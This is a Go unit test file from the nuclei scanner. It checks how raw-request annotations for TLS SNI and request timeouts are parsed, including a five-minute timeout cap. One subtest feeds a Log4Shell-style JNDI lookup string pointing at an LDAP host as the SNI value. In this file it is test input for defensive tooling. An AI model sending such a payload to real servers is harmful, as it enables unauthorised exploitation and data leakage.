package http

import (
	"context"
	"net/http"
	"testing"
	"time"

	"github.com/projectdiscovery/gologger"
	"github.com/projectdiscovery/nuclei/v3/pkg/protocols"
	"github.com/projectdiscovery/nuclei/v3/pkg/protocols/http/httpclientpool"
	"github.com/projectdiscovery/nuclei/v3/pkg/testutils"
	"github.com/projectdiscovery/retryablehttp-go"
	"github.com/stretchr/testify/require"
)

func getExecuterOptions(t *testing.T) *protocols.ExecutorOptions {
	t.Helper()

	options := testutils.DefaultOptions.Copy()
	options.Logger = &gologger.Logger{}
	testutils.Init(options)

	return testutils.NewMockExecuterOptions(options, nil)
}

func TestRequestParseAnnotationsSNI(t *testing.T) {
	t.Run("compliant-SNI-value", func(t *testing.T) {
		req := &Request{connConfiguration: &httpclientpool.Configuration{}}
		rawRequest := `@tls-sni: github.com
		GET / HTTP/1.1
		Host: {{Hostname}}`

		httpReq, err := retryablehttp.NewRequest(http.MethodGet, "https://example.com", nil)
		require.Nil(t, err, "could not create http request")

		overrides, modified := req.parseAnnotations(rawRequest, httpReq)
		require.True(t, modified, "could not apply request annotations")
		require.Equal(t, "github.com", overrides.request.TLS.ServerName)
		require.Equal(t, "example.com", overrides.request.Host)
	})
	t.Run("non-compliant-SNI-value", func(t *testing.T) {
		req := &Request{connConfiguration: &httpclientpool.Configuration{}}
		rawRequest := `@tls-sni: ${jndi:ldap://${hostName}.test.com}
		GET / HTTP/1.1
		Host: {{Hostname}}`

		httpReq, err := retryablehttp.NewRequest(http.MethodGet, "https://example.com", nil)
		require.Nil(t, err, "could not create http request")

		overrides, modified := req.parseAnnotations(rawRequest, httpReq)
		require.True(t, modified, "could not apply request annotations")
		require.Equal(t, "${jndi:ldap://${hostName}.test.com}", overrides.request.TLS.ServerName)
		require.Equal(t, "example.com", overrides.request.Host)
	})
}

func TestRequestParseAnnotationsTimeout(t *testing.T) {
	t.Run("positive", func(t *testing.T) {
		request := &Request{
			options:           getExecuterOptions(t),
			connConfiguration: &httpclientpool.Configuration{NoTimeout: true},
		}
		rawRequest := `@timeout: 2s
		GET / HTTP/1.1
		Host: {{Hostname}}`

		httpReq, err := retryablehttp.NewRequest(http.MethodGet, "https://example.com", nil)
		require.Nil(t, err, "could not create http request")

		overrides, modified := request.parseAnnotations(rawRequest, httpReq)
		require.NotNil(t, overrides.cancelFunc, "could not initialize valid cancel function")
		require.True(t, modified, "could not get correct modified value")

		// Verify context has deadline
		deadline, deadlined := overrides.request.Context().Deadline()
		require.True(t, deadlined, "could not get set request deadline")

		// Verify the timeout value is stored in context
		customTimeout, ok := overrides.request.Context().Value(httpclientpool.WithCustomTimeout{}).(httpclientpool.WithCustomTimeout)
		require.True(t, ok, "custom timeout not found in context")
		require.Equal(t, 2*time.Second, customTimeout.Timeout, "timeout value mismatch")

		// Verify deadline is approximately 2 seconds from now
		expectedDeadline := time.Now().Add(2 * time.Second)
		require.WithinDuration(t, expectedDeadline, deadline, 100*time.Millisecond, "deadline not set correctly")
	})

	t.Run("large-timeout", func(t *testing.T) {
		request := &Request{
			options:           getExecuterOptions(t),
			connConfiguration: &httpclientpool.Configuration{NoTimeout: true},
		}

		// Request a timeout of 10 minutes - should be capped at 5 minutes
		rawRequest := `@timeout: 10m
		GET / HTTP/1.1
		Host: {{Hostname}}`

		httpReq, err := retryablehttp.NewRequest(http.MethodGet, "https://example.com", nil)
		require.Nil(t, err, "could not create http request")

		overrides, modified := request.parseAnnotations(rawRequest, httpReq)
		require.NotNil(t, overrides.cancelFunc, "could not initialize valid cancel function")
		require.True(t, modified, "could not get correct modified value")

		// Verify context has deadline
		deadline, deadlined := overrides.request.Context().Deadline()
		require.True(t, deadlined, "could not get set request deadline")

		// Verify the timeout was capped at 5 minutes (not 10 minutes)
		customTimeout, ok := overrides.request.Context().Value(httpclientpool.WithCustomTimeout{}).(httpclientpool.WithCustomTimeout)
		require.True(t, ok, "custom timeout not found in context")

		require.Equal(t, 5*time.Minute, customTimeout.Timeout, "timeout should be capped at 5 minutes")
		require.Less(t, customTimeout.Timeout, 10*time.Minute, "timeout should be less than requested 10 minutes")

		// Verify deadline matches the capped timeout
		expectedDeadline := time.Now().Add(5 * time.Minute)
		require.WithinDuration(t, expectedDeadline, deadline, 100*time.Millisecond, "deadline not set to capped timeout")
	})

	t.Run("below-cap-timeout", func(t *testing.T) {
		request := &Request{
			options:           getExecuterOptions(t),
			connConfiguration: &httpclientpool.Configuration{NoTimeout: true},
		}

		// Request a timeout of 2 minutes - should be allowed (below 5 minute cap)
		rawRequest := `@timeout: 2m
		GET / HTTP/1.1
		Host: {{Hostname}}`

		httpReq, err := retryablehttp.NewRequest(http.MethodGet, "https://example.com", nil)
		require.Nil(t, err, "could not create http request")

		overrides, modified := request.parseAnnotations(rawRequest, httpReq)
		require.NotNil(t, overrides.cancelFunc, "could not initialize valid cancel function")
		require.True(t, modified, "could not get correct modified value")

		// Verify context has deadline
		deadline, deadlined := overrides.request.Context().Deadline()
		require.True(t, deadlined, "could not get set request deadline")

		// Verify the timeout is NOT capped - should be 2 minutes
		customTimeout, ok := overrides.request.Context().Value(httpclientpool.WithCustomTimeout{}).(httpclientpool.WithCustomTimeout)
		require.True(t, ok, "custom timeout not found in context")

		require.Equal(t, 2*time.Minute, customTimeout.Timeout, "timeout should be the requested 2 minutes")

		// Verify deadline matches the requested timeout
		expectedDeadline := time.Now().Add(2 * time.Minute)
		require.WithinDuration(t, expectedDeadline, deadline, 100*time.Millisecond, "deadline not set to requested timeout")
	})

	t.Run("negative", func(t *testing.T) {
		request := &Request{
			options:           getExecuterOptions(t),
			connConfiguration: &httpclientpool.Configuration{},
		}
		rawRequest := `GET / HTTP/1.1
		Host: {{Hostname}}`

		httpReq, err := retryablehttp.NewRequestWithContext(context.Background(), http.MethodGet, "https://example.com", nil)
		require.Nil(t, err, "could not create http request")

		newRequestWithOverrides, modified := request.parseAnnotations(rawRequest, httpReq)
		require.Nil(t, newRequestWithOverrides.cancelFunc, "cancel function should be nil")
		require.False(t, modified, "could not get correct modified value")
		_, deadlined := newRequestWithOverrides.request.Context().Deadline()
		require.False(t, deadlined, "could not get set request deadline")
	})
}
